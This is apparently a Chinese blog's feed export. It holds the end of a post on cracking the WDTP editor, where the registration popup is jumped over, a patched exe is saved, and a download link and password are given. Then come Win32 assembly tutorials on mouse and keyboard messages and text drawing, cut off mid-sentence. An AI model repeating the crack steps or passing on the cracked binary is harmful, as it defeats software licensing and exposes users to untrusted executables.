alt=""><br>完美，现在新建没问题了。</p><h2 id="导出"><a href="#导出" class="headerlink" title="导出"></a>导出</h2><p>所以我们只需要把它的这个弹注册窗的地方直接jmp过就好，我们在我们修改的命令上面右键补丁<br><img src="http://ww1.sinaimg.cn/large/c0264382gy1fou352soi2j20ed0dbt90.jpg" alt=""><br>然后点击修复文件即可导出成一个破解版的exe。</p><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>下载后注意校验信息<br>文件信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">文件版本: 1.1.1004</span><br><span class="line">修改时间: 2018年2月26日, 19:40:44</span><br><span class="line">MD5: 5B8DF3D4572842376EA850B8551DEEED</span><br><span class="line">SHA1: B282AC870E4159A2ACEA389015FE4F4409A0F887</span><br><span class="line">CRC32: F51675CE</span><br></pre></td></tr></table></figure></p><p><a href="https://share.weiyun.com/5f8f4a09b5fb84f23479479e661b0c69" target="_blank" rel="noopener">密码：h7b4ru</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天来讲讲WDTP这个软件的破解。&lt;/p&gt;
&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;WDTP 不止是一款开源免费的 GUI 桌面单机版静态网站生成器和简单方便的前端开发工具，更是一款跨平台的集笔记、个人知识管理、写作/创作、博客/网站内容与样式管理等功能于一体的多合一内容处理/管理器，同时还是一款高度追求用户体验与计算机文本编写良好感受的 Markdown 编辑器。该软件研发的核心思想是：简洁高效、轻灵优雅、先进强悍、操作简单。&lt;br&gt;
    
    </summary>
    
      <category term="逆向" scheme="http://hacktech.cn/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向" scheme="http://hacktech.cn/tags/%E9%80%86%E5%90%91/"/>
    
      <category term="Tools" scheme="http://hacktech.cn/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>Win32汇编学习(7)：鼠标输入消息</title>
    <link href="http://hacktech.cn/2018/02/09/Win32ASM7-Mouse-input-msg.html"/>
    <id>http://hacktech.cn/2018/02/09/Win32ASM7-Mouse-input-msg.html</id>
    <published>2018-02-09T14:29:19.000Z</published>
    <updated>2018-09-07T08:34:33.081Z</updated>
    
    <content type="html"><![CDATA[<p>这次我们将学习如何在我们的窗口过程函数中处理鼠标按键消息。例子演示了如何等待鼠标左键按下消息，我们将在按下的位置显示一个字符串。<br><a id="more"></a></p><h2 id="理论："><a href="#理论：" class="headerlink" title="理论："></a>理论：</h2><p>和处理键盘输入一样，WINDOWS将捕捉鼠标动作并把它们发送到相关窗口。这些活动包括左、右键按下、移动、双击、滚轮消息<code>WM_WHEEL</code>等。WINDOWS并不像处理键盘输入那样把所有的鼠标消息都导向有输入焦点的窗口，<strong>任何鼠标经过的窗口都将接收到鼠标消息，无论有否输入焦点</strong>。另外，窗口还会接收到鼠标在非客户区移动的消息（<code>WM_NCMOVE</code>），但大多数的情况下我们都会将其忽略掉。当鼠标在某窗口客户区移动时，该窗口将接收到<code>WM_MOUSEMOVE</code>消息。一个窗口若想处理<code>WM_LBUTTONDBCLK</code>或 <code>WM_RBUTTONDBCLK</code>，那么它的窗口类必须有<code>CS_DBLCLKS</code>风格，否则它就会接受到一堆的按键起落（<code>WM_XBUTTONDOWN</code>或<code>WM_XBUTTONUP</code>)的消息。 对于所有的消息，<strong>窗口过程函数传入的参数<code>lParam</code>包含了鼠标的位置，其中低位为x坐标，高位为y坐标</strong>，这些坐标值都是相对于窗口客户区的左上角的值，<code>wParam</code>中则包含了鼠标按钮的状态。 </p><h2 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">.386 </span><br><span class="line">.model flat,stdcall </span><br><span class="line">option casemap:none </span><br><span class="line">WinMain proto :DWORD,:DWORD,:DWORD,:DWORD </span><br><span class="line"></span><br><span class="line">include \masm32\include\windows.inc </span><br><span class="line">include \masm32\include\user32.inc </span><br><span class="line">include \masm32\include\kernel32.inc </span><br><span class="line">include \masm32\include\gdi32.inc </span><br><span class="line">includelib \masm32\lib\user32.lib </span><br><span class="line">includelib \masm32\lib\kernel32.lib </span><br><span class="line">includelib \masm32\lib\gdi32.lib </span><br><span class="line"></span><br><span class="line">.data </span><br><span class="line">ClassName db &quot;SimpleWinClass&quot;,0 </span><br><span class="line">AppName  db &quot;Our First Window&quot;,0 </span><br><span class="line">MouseClick db 0</span><br><span class="line"></span><br><span class="line">.data? </span><br><span class="line">hInstance HINSTANCE ? </span><br><span class="line">CommandLine LPSTR ? </span><br><span class="line">hitpoint POINT &lt;&gt; </span><br><span class="line"></span><br><span class="line">.code </span><br><span class="line">start: </span><br><span class="line">    invoke GetModuleHandle, NULL </span><br><span class="line">    mov    hInstance,eax </span><br><span class="line">    invoke GetCommandLine</span><br><span class="line">    mov CommandLine,eax </span><br><span class="line">    invoke WinMain, hInstance,NULL,CommandLine, SW_SHOWDEFAULT </span><br><span class="line">    invoke ExitProcess,eax </span><br><span class="line"></span><br><span class="line">WinMain proc hInst:HINSTANCE,hPrevInst:HINSTANCE,CmdLine:LPSTR,CmdShow:DWORD </span><br><span class="line">    LOCAL wc:WNDCLASSEX </span><br><span class="line">    LOCAL msg:MSG </span><br><span class="line">    LOCAL hwnd:HWND </span><br><span class="line">    mov   wc.cbSize,SIZEOF WNDCLASSEX </span><br><span class="line">    mov   wc.style, CS_HREDRAW or CS_VREDRAW </span><br><span class="line">    mov   wc.lpfnWndProc, OFFSET WndProc </span><br><span class="line">    mov   wc.cbClsExtra,NULL </span><br><span class="line">    mov   wc.cbWndExtra,NULL </span><br><span class="line">    push  hInst </span><br><span class="line">    pop   wc.hInstance </span><br><span class="line">    mov   wc.hbrBackground,COLOR_WINDOW+1 </span><br><span class="line">    mov   wc.lpszMenuName,NULL </span><br><span class="line">    mov   wc.lpszClassName,OFFSET ClassName </span><br><span class="line">    invoke LoadIcon,NULL,IDI_APPLICATION </span><br><span class="line">    mov   wc.hIcon,eax </span><br><span class="line">    mov   wc.hIconSm,eax </span><br><span class="line">    invoke LoadCursor,NULL,IDC_ARROW </span><br><span class="line">    mov   wc.hCursor,eax </span><br><span class="line">    invoke RegisterClassEx, addr wc </span><br><span class="line">    invoke CreateWindowEx,NULL,ADDR ClassName,ADDR AppName,\ </span><br><span class="line">           WS_OVERLAPPEDWINDOW,CW_USEDEFAULT,\ </span><br><span class="line">           CW_USEDEFAULT,CW_USEDEFAULT,CW_USEDEFAULT,NULL,NULL,\ </span><br><span class="line">           hInst,NULL </span><br><span class="line">    mov   hwnd,eax </span><br><span class="line">    invoke ShowWindow, hwnd,SW_SHOWNORMAL </span><br><span class="line">    invoke UpdateWindow, hwnd </span><br><span class="line">    .WHILE TRUE </span><br><span class="line">                invoke GetMessage, ADDR msg,NULL,0,0 </span><br><span class="line">                .BREAK .IF (!eax) </span><br><span class="line">                invoke DispatchMessage, ADDR msg </span><br><span class="line">    .ENDW </span><br><span class="line">    mov     eax,msg.wParam </span><br><span class="line">    ret </span><br><span class="line">WinMain endp </span><br><span class="line"></span><br><span class="line">WndProc proc hWnd:HWND, uMsg:UINT, wParam:WPARAM, lParam:LPARAM </span><br><span class="line">    LOCAL hdc:HDC </span><br><span class="line">    LOCAL ps:PAINTSTRUCT </span><br><span class="line"></span><br><span class="line">    .IF uMsg==WM_DESTROY </span><br><span class="line">        invoke PostQuitMessage,NULL </span><br><span class="line">    .ELSEIF uMsg==WM_LBUTTONDOWN </span><br><span class="line">        mov eax,lParam </span><br><span class="line">        and eax,0FFFFh </span><br><span class="line">        mov hitpoint.x,eax </span><br><span class="line">        mov eax,lParam </span><br><span class="line">        shr eax,16 </span><br><span class="line">        mov hitpoint.y,eax </span><br><span class="line">        mov MouseClick,TRUE </span><br><span class="line">        invoke InvalidateRect,hWnd,NULL,TRUE </span><br><span class="line">    .ELSEIF uMsg==WM_PAINT </span><br><span class="line">        invoke BeginPaint,hWnd, ADDR ps </span><br><span class="line">        mov    hdc,eax </span><br><span class="line">        .IF MouseClick </span><br><span class="line">            invoke lstrlen,ADDR AppName </span><br><span class="line">            invoke TextOut,hdc,hitpoint.x,hitpoint.y,ADDR AppName,eax </span><br><span class="line">        .ENDIF </span><br><span class="line">        invoke EndPaint,hWnd, ADDR ps </span><br><span class="line">    .ELSE </span><br><span class="line">        invoke DefWindowProc,hWnd,uMsg,wParam,lParam </span><br><span class="line">        ret </span><br><span class="line">    .ENDIF </span><br><span class="line">    xor    eax,eax </span><br><span class="line">    ret </span><br><span class="line">WndProc endp </span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h2 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.ELSEIF uMsg==WM_LBUTTONDOWN </span><br><span class="line">    mov eax,lParam </span><br><span class="line">    and eax,0FFFFh </span><br><span class="line">    mov hitpoint.x,eax </span><br><span class="line">    mov eax,lParam </span><br><span class="line">    shr eax,16 </span><br><span class="line">    mov hitpoint.y,eax </span><br><span class="line">    mov MouseClick,TRUE </span><br><span class="line">    invoke InvalidateRect,hWnd,NULL,TRUE</span><br></pre></td></tr></table></figure><p>窗口过程处理了<code>WM_LBUTTONDOWN</code>消息，当接收到该消息时，<code>lParam</code>中包含了相对于窗口客户区左上角的坐标，我们把它保存下来，放到一个结构体变量（POINT）中，该结构体变量的定义如下： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POINT STRUCT </span><br><span class="line">    x   dd ? </span><br><span class="line">    y   dd ? </span><br><span class="line">POINT ENDS</span><br></pre></td></tr></table></figure><p>然后我们把标志量<code>MouseClick</code>设为<code>TRUE</code>，这表明至少有一次在客户区的左键按下消息。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov eax,lParam </span><br><span class="line">and eax,0FFFFh </span><br><span class="line">mov hitpoint.x,eax</span><br></pre></td></tr></table></figure><p>由于<code>lParam</code>是一个32位长的数，其中高、低16位分别包括了y、x坐标所以我们做一些小处理，以便保存它们。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shr eax,16 </span><br><span class="line">mov hitpoint.y,eax</span><br></pre></td></tr></table></figure><p>保存完坐标后我们设标志<code>MouseClick</code>为<code>TRUE</code>，这是在处理<code>WM_PAINT</code>时用来判断是否有鼠标左键按下消息。然后我们调用<code>InvalidateRect</code>函数迫使WINDOWS重新绘制客户区。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.IF MouseClick </span><br><span class="line">    invoke lstrlen,ADDR AppName </span><br><span class="line">    invoke TextOut,hdc,hitpoint.x,hitpoint.y,ADDR AppName,eax </span><br><span class="line">.ENDIF</span><br></pre></td></tr></table></figure><p>绘制客户区的代码首先检测<code>MouseClick</code>标志位，再决定是否重绘。因为我们在首次显示窗口时还没有左键按下的消息，所以我们在初始时把该标志设为<code>FALSE</code>，告诉WINDOWS不要重绘客户区，当有左键按下的消息时，它会在鼠标按下的位置绘制字符串。注意在调用<code>TextOut</code>函数时，其关于字符串长度的参数是调用<code>lstrlen</code>函数来计算的。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这次我们将学习如何在我们的窗口过程函数中处理鼠标按键消息。例子演示了如何等待鼠标左键按下消息，我们将在按下的位置显示一个字符串。&lt;br&gt;
    
    </summary>
    
      <category term="汇编(ASM)" scheme="http://hacktech.cn/categories/%E6%B1%87%E7%BC%96-ASM/"/>
    
    
      <category term="ASM" scheme="http://hacktech.cn/tags/ASM/"/>
    
      <category term="读书笔记" scheme="http://hacktech.cn/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
      <category term="Windows" scheme="http://hacktech.cn/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>Win32汇编学习(6)：键盘输入消息</title>
    <link href="http://hacktech.cn/2018/02/08/Win32ASM6-Keyboard-input-msg.html"/>
    <id>http://hacktech.cn/2018/02/08/Win32ASM6-Keyboard-input-msg.html</id>
    <published>2018-02-08T09:53:59.000Z</published>
    <updated>2018-09-07T08:34:33.081Z</updated>
    
    <content type="html"><![CDATA[<p>这次，我们将要学习WINDOWS程序是如何处理键盘消息的。<br><a id="more"></a></p><h2 id="理论："><a href="#理论：" class="headerlink" title="理论："></a>理论：</h2><p>因为大多数的PC只有一个键盘，所以所有运行中的WINDOWS程序必须共用它。<strong>WINDOWS 将负责把击键消息送到具有输入焦点的那个应用程序中去</strong>。尽管屏幕上可能同时有几个应用程序窗口，但一个时刻仅有一个窗口有输入焦点。有输入焦点的那个应用程序的标题条总是高亮度显示的。 实际上您可以从两个角度来看键盘消息：一是您可以把它看成是一大堆的按键消息的集合，在这种情况下，当您按下一个键时，WINDOWS就会发送一个 <code>WM_KEYDOWN</code> 给有输入焦点的那个应用程序，提醒它有一个键被按下。当您释放键时，WINDOWS又会发送一个 <code>WM_KYEUP</code> 消息，告诉有一个键被释放。您把每一个键当成是一个按钮；另一种情况是：您可以把键盘看成是字符输入设备。当您按下“a”键时，WINDOWS发送一个 <code>WM_CHAR</code> 消息给有输入焦点的应用程序，告诉它“a”键被按下。实际上WINDOWS 内部发送 <code>WM_KEYDOWN</code> 和 <code>WM_KEYUP</code> 消息给有输入焦点的应用程序，而这些消息将通过调用 <code>TranslateMessage</code> 翻译成 <code>WM_CHAR</code> 消息。WINDOWS窗口过程函数将决定是否处理所收到的消息，一般说来您不大会去处理 <code>WM_KEYDOWN</code> 、 <code>WM_KEYUP</code> 消息，在消息循环中 <code>TranslateMessage</code> 函数会把上述消息转换成 <code>WM_CHAR</code> 消息。这次学习中将只处理 <code>WM_CHAR</code>。 </p><h2 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">.386</span><br><span class="line">.model flat,stdcall</span><br><span class="line">option casemap:none</span><br><span class="line"></span><br><span class="line">WinMain proto :DWORD,:DWORD,:DWORD,:DWORD</span><br><span class="line"></span><br><span class="line">include windows.inc</span><br><span class="line">include user32.inc</span><br><span class="line">include kernel32.inc</span><br><span class="line">include gdi32.inc</span><br><span class="line">includelib user32.lib</span><br><span class="line">includelib kernel32.lib</span><br><span class="line">includelib gdi32.lib</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">ClassName db &quot;SimpleWinClass&quot;,0</span><br><span class="line">AppName   db &quot;Our Fourth Window&quot;,0</span><br><span class="line">char WPARAM 20h</span><br><span class="line"></span><br><span class="line">.data?</span><br><span class="line">hInstance HINSTANCE ?</span><br><span class="line">CommandLine LPSTR ?</span><br><span class="line"></span><br><span class="line">.code</span><br><span class="line">start:</span><br><span class="line">invoke GetModuleHandle,NULL</span><br><span class="line">mov    hInstance,eax</span><br><span class="line">invoke GetCommandLine</span><br><span class="line">mov    CommandLine,eax</span><br><span class="line">invoke WinMain,hInstance,NULL,CommandLine,SW_SHOWDEFAULT</span><br><span class="line">invoke ExitProcess,eax</span><br><span class="line"></span><br><span class="line">WinMain proc hInst:HINSTANCE,hPrevInst:HINSTANCE,CmdLine:LPSTR,CmdShow:DWORD</span><br><span class="line">    </span><br><span class="line">    LOCAL wc:WNDCLASSEX</span><br><span class="line">    LOCAL msg:MSG</span><br><span class="line">    LOCAL hwnd:HWND</span><br><span class="line">    mov wc.cbSize,SIZEOF WNDCLASSEX</span><br><span class="line">    mov wc.style,CS_HREDRAW or CS_VREDRAW</span><br><span class="line">    mov wc.lpfnWndProc,OFFSET WndProc</span><br><span class="line">    mov wc.cbClsExtra,NULL</span><br><span class="line">    mov wc.cbWndExtra,NULL</span><br><span class="line">    push hInst</span><br><span class="line">    pop wc.hInstance</span><br><span class="line">    mov wc.hbrBackground,COLOR_WINDOW+1</span><br><span class="line">    mov wc.lpszMenuName,NULL</span><br><span class="line">    mov wc.lpszClassName,OFFSET ClassName</span><br><span class="line">    invoke LoadIcon,NULL,IDI_APPLICATION</span><br><span class="line">    mov wc.hIcon,eax</span><br><span class="line">    mov wc.hIconSm,eax</span><br><span class="line">    invoke LoadCursor,NULL,IDC_ARROW</span><br><span class="line">    mov wc.hCursor,eax</span><br><span class="line">    invoke RegisterClassEx,ADDR wc</span><br><span class="line">    invoke CreateWindowEx,NULL,ADDR ClassName,ADDR AppName,\</span><br><span class="line">                        WS_OVERLAPPEDWINDOW,CW_USEDEFAULT,CW_USEDEFAULT,\</span><br><span class="line">                        CW_USEDEFAULT,CW_USEDEFAULT,NULL,NULL,hInst,NULL</span><br><span class="line">    mov hwnd,eax</span><br><span class="line">    invoke ShowWindow,hwnd,SW_SHOWNORMAL</span><br><span class="line">    invoke UpdateWindow,hwnd</span><br><span class="line">    .while TRUE</span><br><span class="line">        invoke GetMessage,ADDR msg,NULL,0,0</span><br><span class="line">        .break .if (!eax)</span><br><span class="line">        invoke TranslateMessage,ADDR msg</span><br><span class="line">        invoke DispatchMessage,ADDR msg</span><br><span class="line">    .endw</span><br><span class="line">    mov eax,msg.wParam</span><br><span class="line">    ret</span><br><span class="line"></span><br><span class="line">WinMain endp </span><br><span class="line"></span><br><span class="line">WndProc proc hWnd:HWND,uMsg:UINT,wParam:WPARAM,lParam:LPARAM</span><br><span class="line">    </span><br><span class="line">    LOCAL hdc:HDC</span><br><span class="line">    LOCAL ps:PAINTSTRUCT</span><br><span class="line">    </span><br><span class="line">    .if uMsg==WM_DESTROY</span><br><span class="line">        invoke PostQuitMessage,NULL</span><br><span class="line">    .elseif uMsg==WM_CHAR</span><br><span class="line">        push wParam</span><br><span class="line">        pop  char</span><br><span class="line">        invoke InvalidateRect,hWnd,NULL,TRUE</span><br><span class="line">    .elseif uMsg==WM_PAINT</span><br><span class="line">        invoke BeginPaint,hWnd,ADDR ps</span><br><span class="line">        mov    hdc,eax</span><br><span class="line">        invoke TextOut,hdc,0,0,ADDR char,1</span><br><span class="line">        invoke EndPaint,hWnd,ADDR ps</span><br><span class="line">    .else</span><br><span class="line">        invoke DefWindowProc,hWnd,uMsg,wParam,lParam</span><br><span class="line">        ret</span><br><span class="line">    .endif</span><br><span class="line">    xor eax,eax</span><br><span class="line">    ret</span><br><span class="line"></span><br><span class="line">WndProc endp</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h2 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">char WPARAM 20h</span><br></pre></td></tr></table></figure><p>这个变量将保存从键盘接收到的字符。因为它是在窗口过程中通过WPARAM型变量传送的，所以我们简单地把它定义为WPARAM型。<strong>由于我们的窗口在初次刷新时(也即刚被创建的那一次)是没有键盘输入的所以我们把他设成空格符（20h），这样显示时您就什么都看不见。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.ELSEIF uMsg==WM_CHAR </span><br><span class="line">    push wParam </span><br><span class="line">    pop  char </span><br><span class="line">    invoke InvalidateRect, hWnd,NULL,TRUE</span><br></pre></td></tr></table></figure><p>这一段是用来处理<code>WM_CHAR</code>消息的。它把接收到的字符放入变量<code>char</code>中，接着调用<code>InvalidateRect</code>，而InvalidateRect使得窗口的客户区无效，这样它会发出WM_PAINT消息，而WM_PAINT消息迫使WINDOWS重新绘制它的客户区。该函数的语法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">InvalidateRect proto hWnd:HWND, lpRect:DWORD, bErase:DWORD</span><br></pre></td></tr></table></figure><p><code>lpRect</code>是指向客户区我们想要其无效的一个正方形结构体的指针。如果该值等于<code>NULL</code>，则整个客户区都无效；布尔值<code>bErase</code>告诉WINDOWS是否擦除背景，如果是TRUE，则WINDOWS在调用BeginPaint函数时把背景擦掉。 所以我们此处的做法是：<strong>我们将保存所有有关重绘客户区的数据，然后发送<code>WM_PAINT</code>消息(通过<code>InvalidateRect</code>)，处理该消息的程序段然后根据相关数据重新绘制客户区。实际上我们完全可以通过调用 <code>GetDC</code> 获得设备上下文句柄，然后绘制字符，然后再调用<code>ReleaseDC</code>释放设备上下文句柄，毫无疑问这样也能在客户区绘制出正确的字符。但是如果这之后接收到<code>WM_PAINT</code>消息要处理时，客户区会重新刷新，而我们这稍前所绘制的字符就会消失掉。所以为了让字符一直正确地显示，就必须把它们放到<code>WM_PAINT</code>的处理过程中处理。而在本消息处理中发送<code>WM_PAINT</code>消息即可。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke TextOut,hdc,0,0,ADDR char,1</span><br></pre></td></tr></table></figure><p><strong>在调用<code>InvalidateRect</code>时，<code>WM_PAINT</code>消息被发送到了WINDOWS窗口处理过程，程序流程转移到处理<code>WM_PAINT</code>消息的程序段</strong>，然后调用<code>BeginPaint</code>得到设备上下文的句柄，再调用<code>TextOut</code>在客户区的（0，0）处输出保存的按键字符。这样无论您按什么键都能在客户区的左上角显示，不仅如此，无论您怎么缩放窗口（迫使WINDOWS重新绘制它的客户区），字符都会在正确的地方显示，所以<strong>必须把所有重要的绘制动作都放到处理<code>WM_PAINT</code>消息的程序段中去</strong>。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这次，我们将要学习WINDOWS程序是如何处理键盘消息的。&lt;br&gt;
    
    </summary>
    
      <category term="汇编(ASM)" scheme="http://hacktech.cn/categories/%E6%B1%87%E7%BC%96-ASM/"/>
    
    
      <category term="ASM" scheme="http://hacktech.cn/tags/ASM/"/>
    
      <category term="读书笔记" scheme="http://hacktech.cn/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
      <category term="Windows" scheme="http://hacktech.cn/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>Win32汇编学习(5)：绘制文本2</title>
    <link href="http://hacktech.cn/2018/02/08/Win32-ASM-5-draw-text.html"/>
    <id>http://hacktech.cn/2018/02/08/Win32-ASM-5-draw-text.html</id>
    <published>2018-02-08T07:55:46.000Z</published>
    <updated>2018-09-07T08:34:33.081Z</updated>
    
    <content type="html"><![CDATA[<p>这次我们将学习有关文本的诸多属性如字体和颜色等。<br><a id="more"></a></p><h2 id="理论："><a href="#理论：" class="headerlink" title="理论："></a>理论：</h2><p>Windows 的颜色系统是用RGB值来表示的，R 代表红色，G 代表绿色，B 代表蓝色。如果您想指定一种颜色就必须给该颜色赋相关的 RGB 值，RGB 的取值范围都是从 0 到 255，譬如您想要得到纯红色，就必须对RGB赋值（255，0，0），纯白色是 （255，255，255）。</p><p>您可以用函数 <code>SetTextColor</code> 和 <code>SetBkColor</code> 来“绘制”字符颜色和背景色，但是必须传递一个“设备环境”的句柄和 RGB 值作为参数。RGB 的结构体的定义如下： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">RGB_value struct</span><br><span class="line">unused db 0</span><br><span class="line">blue db ?</span><br><span class="line">green db ?</span><br><span class="line">red db ?</span><br><span class="line">RGB_value ends</span><br></pre></td></tr></table></figure><p>其中第一字节为 0 而且始终为 0，其它三个字节分别表示蓝色、绿色和红色，刚好和 RGB 的次序相反。这个结构体用起来挺别扭，所以我们重新定义一个宏用它来代替。该宏接收红绿蓝三个参数，并在 eax 寄存器中返回 32 位的 RGB 值，宏的定义如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">RGB macro red，green，blue</span><br><span class="line">xor eax，eax</span><br><span class="line">mov ah，blue</span><br><span class="line">shl eax，8</span><br><span class="line">mov ah，green</span><br><span class="line">mov al，red</span><br><span class="line">endm</span><br></pre></td></tr></table></figure><p>您可以把该宏放到头文件中以方便使用。 </p><p>您可以调用 <code>CreateFont</code> 和 <code>CreateFontIndirect</code> 来创建自己的字体，这两个函数的差别是：前者要求您传递一系列的参数，而后者只要传递一个指向 <code>LOGFONT</code> 结构的指针。这样就使得后者使用起来更方便，尤其当您需要频繁创建字体时。在我们的例子中由于只要创建一种字体，故用 <code>CreateFont</code> 